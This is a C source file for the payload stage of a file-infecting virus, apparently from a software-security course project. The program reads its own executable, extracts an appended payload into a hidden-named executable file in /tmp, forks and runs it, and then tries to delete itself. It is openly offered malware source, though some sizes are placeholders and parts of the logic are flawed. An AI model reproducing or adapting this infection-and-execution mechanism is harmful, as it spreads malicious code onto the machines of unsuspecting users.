//
//  payload.c
//  SoftSec Virus
//
//  Created by Carter McCardwell on 11/17/17.
//  GPLv2+: GNU GPL version 2 or later.
//

//This is the C code that is compiled to the payload package seen in the dropper

#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>

//PAYLOAD_SIZE and st_sz are updated in assembly by the dropper, so these values
//aren't important and are set for each execuable infected
#define PAYLOAD_SIZE 1234

int main() {
    int st_sz = 0;
    char path[] = "/proc/self/exe";
     
    int self_hdl = open(path, O_RDONLY, 0);
    void *self = mmap(NULL, st_sz, PROT_READ, MAP_PRIVATE, self_hdl, 0);

    char filepath[15] = "/tmp/cJ8f0asjf";
    int handle = open(filepath, O_RDWR | O_CREAT, 0700);
    write(handle, self+(st_sz-PAYLOAD_SIZE), PAYLOAD_SIZE);
    close(handle);
    munmap(self, st_sz);
    int proc = fork();
    if (proc != 0) {
        execve(filepath, NULL, NULL);
    }
    remove(path);
    wait4(proc, NULL, 0, NULL);
}


